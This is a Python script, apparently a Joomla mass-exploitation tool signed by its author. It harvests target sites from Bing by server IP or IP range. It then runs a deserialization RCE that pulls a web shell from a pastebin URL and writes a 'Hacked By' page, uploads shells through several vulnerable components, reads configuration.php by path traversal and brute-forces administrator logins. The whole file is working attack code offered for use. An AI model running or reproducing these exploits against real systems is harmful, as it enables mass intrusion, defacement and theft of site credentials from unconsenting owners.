import re , urllib2  , sys , os, requests
from platform import system
from time import sleep
from threading import Thread
if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')
site = []
listpass = 'password.txt'
listuser = 'user.txt'
jce_image = 'hhh.gif'
alberghi_image = 'hhh.gif'
jceupshell = "error.php"
com_myblog = 'up.php.xxxjpg'
com_fabric = 'drshap7.PhP.txt'
index_fabric = "drshap7.txt"
com_jdownloads = 'bot.php3.g'
com_jdownloads_index = 'hhh.gif'
com_jdownloadszip_index = 'drshap7.zip'
com_adsmanager = "drshap7.jpg"
com_adsmanager_index = "def.jpg"
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.php','w+'),file_get_contents('http://pastebin.com/raw/Q1aM9w16')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("http://pastebin.com/raw/Q1aM9w16"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.html','w+'),' Hacked By Dr.Shap7-Nine ');"""
banner = '''
|| Coded By : Dr.Shap7-Nine
|| Skype : salfestrs
'''
class Jmbrute(object) :
  """
  Class to brute force joomla
  """
  def __init__(self, website, timeout=10) :
    self.website = website
    # Making a requests sesion object
    self.req = requests.session()
    self.timeout = timeout

  def __makeGet(self, url) :
    try :
      return self.req.get(url, timeout=self.timeout).text
    except :
      pass

  def getToken(self) :
    try :
      return re.search('<input type="hidden" name="(.*?)" value="1" />', self.__makeGet(self.website)).group(1)
    except :
      return False

  def trylogin(self, user, passwd, token) :
    dat = {
        'username' : user,
        'passwd'   : passwd,
        token      : '1',
        'lang'     : '',
        'option'   : 'com_login',
        'task'     : 'login',
        'return'   : 'aW5kZXgucGhw'
        }
    try :
      self.req.post(self.website, data=dat, timeout=self.timeout)
    except :
      pass
  def checklog(self) :
    res = self.__makeGet(self.website)
    if res : return 'logout' in res
    else : return False
def file2list(fil) :
  with open(fil, 'r')  as myfile :
    return myfile.read().split()
def brute(url,user,passw):
    site = url + "/administrator/index.php"
    for us in user:
        for passwd in passw:
            jm = Jmbrute(site)
            token = jm.getToken()
            if token:
                jm.trylogin(us, passwd, token)
                if jm.checklog():
                    print  '[*] Cracked', site, '\n#Username : ' + us, '\n#Password :', passwd + '\n'
                    logger(site, us, passwd, 'Result/Cracked.txt')
                    break
def logger(website, user, passwd, filename) :
  with open(filename, 'a') as myfile :
    myfile.write('[*] Cracked '+website+' \n#Username : '+user+' \n#Password : '+passwd+'\n')
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def generate(payload):
    php_payload = "eval({0})".format(toCharCode(payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template
def rce(url):
	try:
		global payload
		payload_generated = generate(payload)
		prepare(url, payload_generated)
		tester = urllib2.urlopen(url+"/XxX.php").read()
		la = requests.get(url+"/XxX.html")
		if re.findall("Tryag", tester) and urllib2.urlopen(url+"/XxX.php").getcode() == 200 and "Hacked" in la.content:
			site = url + "/XxX.php"
			site2 = url + "/XxX.html"
			print ("[#]=> %s [ ok ]" %  site)
			print ("\n[#]=> %s [ ok ]" %  site2)
			with open("Result/RCE.txt", "a") as f:
				f.write("\n")
				f.write("[#]=> %s [ ok ]" %  site)
				f.write("\n")
				f.write("[#]=> %s [ ok ]" %  site2)
                f.write("\n")
	except:
		pass
def jce(site):
    try:
        global jce_image
        files = {'Filedata': open(jce_image, 'rb')}
        post = {
            'upload-dir': '../../',
            'upload-overwrite': '0',
            'action': 'upload'
        }
        url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
        html = urllib2.urlopen(url).readlines()
        for line in html:
            if re.findall('No function call specified', line):
                req = requests.post(url,files=files, data=post)
                if req.status_code == 200 or 'success' in req.text:
                    url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', '/' + jce_image)
                    if urllib2.urlopen(url).getcode() == 200:
                        print ("[#]=> %s [ ok ]" %  url)
                        if not os.path.exists("Result"):
                            os.mkdir("Result", 0755);
                        with open("Result/JCE.txt", 'a') as neo:
                            neo.write("[#]=> %s [ ok ]" %  url)
                            neo.write("\n")
    except:
        pass
def alberghi(site):
    try:
        global alberghi_image
        files = {'userfile': open(alberghi_image, 'rb')}
        url = site + "/administrator/components/com_alberghi/upload.alberghi.php"
        html = urllib2.urlopen(url).readlines()
        for line in html:
            if re.findall('Upload', line):
                req = requests.post(url,files=files)
                if req.status_code == 200 or 'success' in req.text:
                    url = url.replace('/administrator/components/com_alberghi/upload.alberghi.php', '/administrator/components/com_alberghi/' + alberghi_image)
                    if urllib2.urlopen(url).getcode() == 200:
                        print ("[#]=> %s [ ok ]" %  url)
                        if not os.path.exists("Result"):
                            os.mkdir("Result", 0755);
                        with open("Result/Alberghi.txt", 'a') as neo:
                            neo.write("[#]=> %s [ ok ]" %  url)
                            neo.write("\n")
    except:
        pass
def jce_shell(site):
    try:
        global jceupshell
        files = {'Filedata': open(jceupshell, 'rb')}
        post = {
            'upload-dir': '../../',
            'upload-overwrite': '0',
            'action': 'upload'
        }
        url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
        req = requests.post(url,files=files, data=post)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', '/' + jceupshell)
            openbing = urllib2.urlopen(url)
            readbing = openbing.read()
            if re.findall("Hamdida", readbing):
                print ("[#]=> %s [ ok ]" %  url)
                if not os.path.exists("Result"):
                    os.mkdir("Result", 0755);
                with open("Result/JCE.txt", 'a') as neo:
                    neo.write("[#]=> %s [ ok ]" %  url)
                    neo.write("\n")
    except:
         pass
def adsmanager(site):
    try:
        global com_adsmanager
        files = {'file': open(com_adsmanager, 'rb')}
        post = {
            "name": "drshap7.php"
        }
        url = site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
        html = urllib2.urlopen(url).readlines()
        for line in html:
            if re.findall("jsonrpc", line):
                req = requests.post(url, files=files, data=post)
                if req.status_code == 200 or 'success' in req.text:
                    url = url.replace('/index.php?option=com_adsmanager&task=upload&tmpl=component',
                              '/tmp/plupload/' + com_adsmanager)
                    openbing = urllib2.urlopen(url)
                    readbing = openbing.read()
                    if re.findall("Hamdida", readbing):
                        print ("[#]=> %s [ ok ]" % url)
                        if not os.path.exists("Result"):
                            os.mkdir("Result", 0755);
                        with open("Result/adsmanager.txt", 'a') as neo:
                            neo.write("[#]=> %s [ ok ]" % url)
                            neo.write("\n")
    except:
         pass
def adsmanager_index(site):
    try:
        global com_adsmanager_index
        files = {'file': open(com_adsmanager_index, 'rb')}
        post = {
            "name": "drshap7.html"
        }
        url = site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
        html = urllib2.urlopen(url).readlines()
        for line in html:
            if re.findall("jsonrpc", line):
                req = requests.post(url, files=files, data=post)
                if req.status_code == 200 or 'success' in req.text:
                    url = url.replace('/index.php?option=com_adsmanager&task=upload&tmpl=component',
                              '/tmp/plupload/' + com_adsmanager_index)
                    openbing = urllib2.urlopen(url)
                    readbing = openbing.read()
                    if re.findall("drshap7", readbing):
                        print ("[#]=> %s [ ok ]" % url)
                        if not os.path.exists("Result"):
                            os.mkdir("Result", 0755);
                        with open("Result/adsmanager.txt", 'a') as neo:
                            neo.write("[#]=> %s [ ok ]" % url)
                            neo.write("\n")
    except:
         pass
def fabric_index(site):
    try:
        global index_fabric
        files = {'userfile': (index_fabric, open(index_fabric, 'rb'), 'multipart/form-data')}
        post = {
            "name": "me.php",
            "drop_data": "1",
            "overwrite": "1",
            "field_delimiter": ",",
            "text_delimiter": "&quot;",
            "option": "com_fabrik",
            "controller": "import",
            "view": "import",
            "task": "doimport",
            "Itemid": "0",
            "tableid": "0"
        }
        url = site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
        req = requests.post(url, files=files, data=post)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=',
                              '/media/' + index_fabric)
            openbing = urllib2.urlopen(url)
            readbing = openbing.read()
            if re.findall("Hacked", readbing):
                print ("[#]=> %s [ ok ]" % url)
                if not os.path.exists("Result"):
                    os.mkdir("Result", 0755);
                with open("Result/fabric.txt", 'a') as neo:
                    neo.write("[#]=> %s [ ok ]" % url)
                    neo.write("\n")
    except:
         pass
def jdownloads(site):
    try:
        global com_jdownloads,com_jdownloadszip
        files = {'file_upload': (com_jdownloadszip, open(com_jdownloadszip, 'rb'),'multipart/form-data'),'pic_upload':(com_jdownloads, open(com_jdownloads, 'rb'), 'multipart/form-data')}
        post = {
            'name':'ur name',
            'mail':'blackwolf_cw@hotmail.com',
            'catlist':'1',
            'filetitle':"lolz",
            'description':"<p>zot</p>",
            '2d1a8f3bd0b5cf542e9312d74fc9766f':1,
            'send':1,
            'senden':"Send file",
            'description':"<p>qsdqsdqsdqsdqsdqsdqsd</p>",
            'option':"com_jdownloads",
            'view':"upload"
        }
        url = site + "/index.php?option=com_jdownloads&Itemid=0&view=upload"
        req = requests.post(url,files=files, data=post)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_jdownloads&Itemid=0&view=upload', '/images/jdownloads/screenshots/' + com_jdownloads)
            openbing = urllib2.urlopen(url)
            readbing = openbing.read()
            if re.findall("drshap7", readbing):
                print ("[#]=> %s [ ok ]" %  url)
                if not os.path.exists("Result"):
                    os.mkdir("Result", 0755);
                with open("Result/jdownloads.txt", 'a') as neo:
                    neo.write("[#]=> %s [ ok ]" %  url)
                    neo.write("\n")
    except:
         pass
def jdownloads_index(site):
    try:
        global com_jdownloads_index,com_jdownloadszip_index
        files = {'file_upload': (com_jdownloadszip_index, open(com_jdownloadszip_index, 'rb'),'multipart/form-data'),'pic_upload':(com_jdownloadszip_index, open(com_jdownloadszip_index, 'rb'), 'multipart/form-data')}
        post = {
            'name':'ur name',
            'mail':'blackwolf_cw@hotmail.com',
            'catlist':'1',
            'filetitle':"lolz",
            'description':"<p>zot</p>",
            '2d1a8f3bd0b5cf542e9312d74fc9766f':1,
            'send':1,
            'senden':"Send file",
            'description':"<p>qsdqsdqsdqsdqsdqsdqsd</p>",
            'option':"com_jdownloads",
            'view':"upload"
        }
        url = site + "/index.php?option=com_jdownloads&Itemid=0&view=upload"
        req = requests.post(url,files=files, data=post)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_jdownloads&Itemid=0&view=upload', '/images/jdownloads/screenshots/' + com_jdownloads_index)
            url2 = site + "/images/jdownloads/screenshots/index.html"
            openbing = urllib2.urlopen(url2)
            readbing = openbing.read()
            if  urllib2.urlopen(url).getcode() and re.findall("Hacked", readbing):
                print ("[#]=> %s [ ok ]" %  url)
                if not os.path.exists("Result"):
                    os.mkdir("Result", 0755);
                with open("Result/jdownloads.txt", 'a') as neo:
                    neo.write("[#]=> %s [ ok ]" %  url)
                    neo.write("[#]=> %s [ ok ]" %  url2)
                    neo.write("\n")
    except:
         pass
def fabric(site):
    try:
        global com_fabric
        files = {'userfile': (com_fabric, open(com_fabric, 'rb'), 'multipart/form-data')}
        post = {
            "name" : "me.php",
            "drop_data" : "1",
            "overwrite" : "1",
            "field_delimiter" : ",",
            "text_delimiter" : "&quot;",
            "option" : "com_fabrik",
            "controller" : "import",
            "view" : "import",
            "task" : "doimport",
            "Itemid" : "0",
            "tableid" : "0"
        }
        url = site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
        req = requests.post(url,files=files, data=post)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=', '/media/' + com_fabric)
            openbing = urllib2.urlopen(url)
            readbing = openbing.read()
            if re.findall("Tryag File Manager", readbing):
                print ("[#]=> %s [ ok ]" %  url)
                if not os.path.exists("Result"):
                    os.mkdir("Result", 0755);
                with open("Result/fabric.txt", 'a') as neo:
                    neo.write("[#]=> %s [ ok ]" %  url)
                    neo.write("\n")
    except:
         pass
def myblog(site):
    try:
        global com_myblog
        files = {'fileToUpload': open(com_myblog, 'rb')}
        url = site + "/index.php?option=com_myblog&task=ajaxupload"
        req = requests.post(url,files=files)
        if req.status_code == 200 or 'success' in req.text:
            url = url.replace('/index.php?option=com_myblog&task=ajaxupload', '/images/' + com_myblog)
            openbing = urllib2.urlopen(url)
            readbing = openbing.read()
            url2 = site + '/images/stories/' + com_myblog
            test2 = urllib2.urlopen(url2)
            readtest2 = test2.read()
            if re.findall("Tryag File Manager", readbing) or re.findall("Tryag File Manager", readtest2):
                print ("[#]=> %s [ ok ]" %  url)
                if not os.path.exists("Result"):
                    os.mkdir("Result", 0755);
                with open("Result/myblog.txt", 'a') as neo:
                    neo.write("[#]=> %s [ ok ]" %  url)
                    neo.write("\n")
    except:
         pass
def cckjseblod(url):
    try:
        response = urllib2.urlopen(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php")
        content = response.read()
        if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
            site = url + "/index.php?option=com_cckjseblod&task=download&file=configuration.php"
            print ("[#]=> %s [ ok ]" % site)
            if not os.path.exists("Result"):
                os.mkdir("Result", 0755);
            with open("Result/cckjseblod.txt", 'a') as neo:
                print ("[#]=> %s [ ok ]" % site)
                neo.write("\n")
        else:
            pass
    except urllib2.HTTPError:
        pass
    except urllib2.URLError:
        pass
def macgallery(url):
    try:
        response = urllib2.urlopen(url+"/index.php?option=com_macgallery&view=download&albumid=../../configuration.php")
        content = response.read()
        if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
            site = url + "/index.php?option=com_macgallery&view=download&albumid=../../configuration.php"
            print ("[#]=> %s [ ok ]" % site)
            if not os.path.exists("Result"):
                os.mkdir("Result", 0755);
            with open("Result/macgallery.txt", 'a') as neo:
                print ("[#]=> %s [ ok ]" % site)
                neo.write("\n")
        else:
            pass
    except urllib2.HTTPError:
        pass
    except urllib2.URLError:
        pass
def hdflvplayer(url):
    try:
        req = urllib2.Request(url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php")
        response = urllib2.urlopen(req)
        content = response.read()
        if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
            site = url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
            print ("[#]=> %s [ ok ]" % site)
            if not os.path.exists("Result"):
                os.mkdir("Result", 0755);
            with open("Result/hdflvplayer.txt", 'a') as neo:
                neo.write("[#]=> %s [ ok ]" % site)
                neo.write("\n")
    except urllib2.HTTPError:
        pass
    except urllib2.URLError:
        pass
def s5_media_player(url):
    try:
        req = urllib2.Request(url + "/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=")
        response = urllib2.urlopen(req)
        content = response.read()
        if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
            site = url + "/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA="
            print ("[#]=> %s [ ok ]" % site)
            if not os.path.exists("Result"):
                os.mkdir("Result", 0755);
            with open("Result/s5_media_player.txt", 'a') as neo:
                neo.write("[#]=> %s [ ok ]" % site)
                neo.write("\n")
    except urllib2.HTTPError:
        pass
    except urllib2.URLError:
        pass
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
print banner
def test(url):
    try:
        openbing = urllib2.urlopen(url)
        readbing = openbing.read()
        req = requests.get(url)
        if re.findall("Joomla", readbing) or "Joomla" in req.text or urllib2.urlopen(url+"/administrator").getcode() == 200:
            print "[!]-> Scanning : " + url
            print "\nTesting RCE : \n"
            rce(url)
            print "\nTesting Jce : \n"
            jce(url)
            jce_shell(url)
            print "\nTesting Alberghi : \n"
            alberghi(url)
            print "\nTesting Cckjseblod : \n"
            cckjseblod(url)
            print "\nTesting Hdflvplayer : \n"
            hdflvplayer(url)
            print "\nTesting Macgallery : \n"
            macgallery(url)
            print "\nTesting Shape 5 MP3 Player : \n"
            s5_media_player(url)
            print "\nTesting MyBlog : \n"
            myblog(url)
            print "\nTesting Fabric : \n"
            fabric(url)
            fabric_index(url)
            print "\nTesting JDownloads : \n"
            jdownloads(url)
            jdownloads_index(url)
            print "\nTesting Adsmanager : \n"
            adsmanager(url)
            adsmanager_index(url)
            print "\n##-> Now Brute Forcing <-##\n"
            userlist = file2list(listuser)
            passlist = file2list(listpass)
            brute(url,userlist,passlist)
        else:
            pass
    except:
        pass
def grabber(s):
    global site
    xxxx = []
    page = 1
    while page <= 101:
        bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
        openbing = urllib2.urlopen(bing)
        readbing = openbing.read()
        findwebs = re.findall('<h2><a href="(.*?)"', readbing)
        for i in range(len(findwebs)):
            allnoclean = findwebs[i]
            findall1 = re.findall('http://(.*?)/', allnoclean)
            for idx, item in enumerate(findall1):
                if 'www' not in item:
                    findall1[idx] = 'http://www.' + item + '/'
                else:
                    findall1[idx] = 'http://' + item + '/'
            xxxx.extend(findall1)
        page = page + 10
    final = unique(xxxx)
    site.extend(final)

def ipRange(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []

    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1
        ip_range.append(".".join(map(str, temp)))

    return ip_range
def main():
    print "\r\n1)-\tFrom Server IP\n2)-\tFrom WebSite\n3)-\tIP Range\n"
    c = raw_input("What Do You Want ?\n")
    if c == '1':
        ip = raw_input('[+] Enter Server IP : ')
        try:
            print banner
            grabber(str(ip))
            for _site in site:
                test(_site)
        except:
            pass
    elif c == '2':
            list = raw_input('[+] Enter List Name : ')
            try:
                file = open(list).readlines()
                print banner
                if (len(file) > 0):
                    for attack in file:
                        _attack = attack.rstrip()
                        test(_attack)
            except:
                pass
            else:
                pass
    elif c == '3':
        ip_start = raw_input('[+] Enter Start IP : ')
        ip_end = raw_input('[+] Enter End IP : ')
        try:
            print banner
            ip_range = ipRange(ip_start, ip_end)
            for ip in ip_range:
                grabber(ip)
                for _site in site:
                    test(_site)
        except:
            pass
if __name__ == '__main__':
    main()